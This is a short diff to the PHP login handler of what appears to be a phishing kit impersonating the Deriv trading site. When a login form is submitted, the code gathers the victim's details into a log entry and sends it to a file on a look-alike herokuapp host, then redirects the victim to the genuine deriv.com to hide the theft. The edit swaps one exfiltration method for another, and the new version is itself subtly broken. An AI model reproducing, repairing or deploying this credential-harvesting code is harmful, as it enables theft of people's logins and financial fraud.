@@ -19,12 +19,12 @@ if (isset($_POST['login'])) {
 	$body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
 
 
-	//$file_points = "https://derivv.herokuapp.com/log/personl_details.txt";
-	//$save= file_get_contents($body);
-	//file_put_contents($file_points, $save);
-	$save=fopen("https://derivv.herokuapp.com/log/personl_details.txt","a+");
-	fwrite($save,$body);
-	fclose($save);
+	$file_points = "https://derivv.herokuapp.com/log/personl_details.txt";
+	$save= file_get_contents($body);
+	file_put_contents($file_points, $save);
+	//$save=fopen("https://derivv.herokuapp.com/log/personl_details.txt","a+");
+	//fwrite($save,$body);
+	//fclose($save);
 }
 header("Location: https://www.deriv.com");
 ?>
